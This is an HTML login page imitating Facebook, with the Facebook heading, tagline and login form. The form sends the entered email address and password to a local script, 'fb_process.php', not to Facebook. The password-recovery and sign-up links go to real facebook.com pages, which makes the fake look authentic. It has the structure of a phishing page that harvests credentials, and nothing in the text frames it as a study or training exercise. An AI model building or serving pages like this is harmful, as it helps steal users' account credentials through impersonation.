<html>

<head>
    <meta charset="UTF-8">
    <title>Facebook page</title>
    <link rel="stylesheet" href="css/fbstyle.css">
</head>

<body>
    <div class="container">
        <div class="left">
            <h1>Facebook</h1>
            <p>Facebook helps you cannect and share with the people in your life</p>
        </div>
        <div class="right">
            <form name="fbform" method="post" action="fb_process.php">
                <input class="right" type="text" name="email" placeholder="Email address">
                <input class="right" type="password" name="password" placeholder="password">

                <input type="submit" class="loginbtn" value="Log in" name="save">

                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forget">Forgotten password?</a>

                <div class="Sign-up">
                    <a href="https://www.facebook.com/reg/" class="signupbtn">Create New Account</a>
                </div>
            </form>
            <p>Create a page for a celebrity band or business</p>
        </div>
    </div>
</body>

</html>